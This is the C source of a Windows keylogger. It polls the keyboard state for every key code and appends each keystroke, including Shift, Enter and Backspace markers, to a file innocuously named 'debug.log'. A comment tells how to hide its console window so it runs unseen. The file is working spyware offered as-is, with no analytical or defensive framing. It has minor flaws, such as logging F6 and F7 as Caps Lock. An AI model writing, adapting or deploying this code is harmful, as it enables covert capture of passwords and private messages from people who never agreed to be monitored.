#include <windows.h>
#include <stdio.h>

#define global_variable static
global_variable bool GlobalRunning;
global_variable HWND RecordKey;

int key_record(void);

int main()
{
	//Alloc Console Function: 
	//https://msdn.microsoft.com/en-us/library/windows/desktop/ms681944(v=vs.85).aspx
	AllocConsole();
	//Find Window Function: 
	//https://msdn.microsoft.com/en-us/library/windows/desktop/ms633499(v=vs.85).aspx
	RecordKey = FindWindowA("ConsoleWindowClass", NULL);
	//Change 10 to 0 to hide auto-hide windowShow Window Function: 
	//https://msdn.microsoft.com/en-us/library/windows/desktop/ms633548(v=vs.85).aspx
	ShowWindow(RecordKey, 10);

	int a = key_record();
	return a;
}


int key_record(void)
{
	short key;
	GlobalRunning = true;
	while (GlobalRunning)
	{
		Sleep(100); //100 milliseconds
		for (key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) & 0x0001)

			{
				FILE *logfile;
				fopen_s(&logfile, "debug.log", "a+");
				if (logfile == NULL)
				{
					return 1;
				}
				if (logfile != NULL)
				{
					if (key == VK_END)
					{

						fputs("[End Key Pressed Exiting Key Record Logging]", logfile);
						fclose(logfile);
						CloseWindow(RecordKey);
						exit(EXIT_SUCCESS);
					}

					if ((key >= 39) && (key <= 64))
					{
						fputc(key, logfile);
						fclose(logfile);
						break;
					}
					//increment letters A-Z by 32 making all letters logged lowercase
					else if ((key>64) && (key<91))
					{
						key += 32;
						fputc(key, logfile);
						fclose(logfile);
						break;
					}
					else
					{
						switch (key)
						{
							// Virtual-Key Codes 
							//https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
						case VK_SPACE:
							fputc(' ', logfile);
							fclose(logfile);
							break;
						case VK_SHIFT:
							fputs("[SHIFT]", logfile);
							fclose(logfile);
							break;
						case VK_RETURN:
							fputs("\n[ENTER]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_1:
							fputs("[;:]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_2:
							fputs("[/?]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_3:
							fputs("[`~]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_4:
							fputs("[ [{ ]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_5:
							fputs("[\\|]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_6:
							fputs("[ ]} ]", logfile);
							fclose(logfile);
							break;
						case VK_OEM_7:
							fputs("['\"]", logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD0:
							fputc('0', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD1:
							fputc('1', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD2:
							fputc('2', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD3:
							fputc('3', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD4:
							fputc('4', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD5:
							fputc('5', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD6:
							fputc('6', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD7:
							fputc('7', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD8:
							fputc('8', logfile);
							fclose(logfile);
							break;
						case VK_NUMPAD9:
							fputc('9', logfile);
							fclose(logfile);
							break;
						case VK_CAPITAL:
							fputs("[CAPS LOCK]", logfile);
							fclose(logfile);
							break;
						case VK_F6:
							fputs("[CAPS LOCK]", logfile);
							fclose(logfile);
							break;
						case VK_F7:
							fputs("[CAPS LOCK]", logfile);
							fclose(logfile);
							break;
						case VK_CONTROL:
							fputs("[CTRL]", logfile);
							fclose(logfile);
							break;
						case VK_BACK:
							fputs("[BACKSPACE]", logfile);
							fclose(logfile);
							break;
						case VK_DELETE:
							fputs("[DEL]", logfile);
							fclose(logfile);
							break;
						case VK_TAB:
							fputs("[TAB1]", logfile); 
							fclose(logfile);
							break;
						default:
							fclose(logfile);
							break;
						}
					}
				}
			}
		}
	}
	return EXIT_SUCCESS;
}

